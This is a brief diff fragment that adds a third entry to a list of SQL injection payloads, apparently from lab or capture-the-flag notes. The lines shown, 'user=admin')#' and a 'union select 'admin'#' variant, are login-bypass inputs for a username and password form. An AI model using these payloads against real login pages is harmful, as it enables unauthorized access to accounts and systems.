@@ -34,5 +34,9 @@
 
 `payload2:user=admin')#&pass=1`
 
+`payload3:user=') union select 'admin'#&pass=1`
+
+
+
 
 
